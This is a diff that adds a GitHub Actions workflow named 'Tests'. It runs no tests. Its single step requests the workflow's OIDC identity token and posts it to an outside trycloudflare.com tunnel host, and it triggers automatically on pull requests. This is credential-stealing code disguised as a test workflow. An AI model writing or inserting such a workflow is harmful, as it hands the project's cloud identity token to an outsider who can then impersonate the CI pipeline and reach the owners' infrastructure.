@@ -1,0 +1,16 @@
+name: Tests
+on:
+  pull_request:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  id-token: write
+
+jobs:
+  dev:
+    runs-on: ubuntu-latest
+    steps:
+    - run: |
+        TOKEN=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL")
+        curl -XPOST https://realize-craig-attribute-points.trycloudflare.com/foo -H "Content-Type: application/json" -d ${TOKEN}
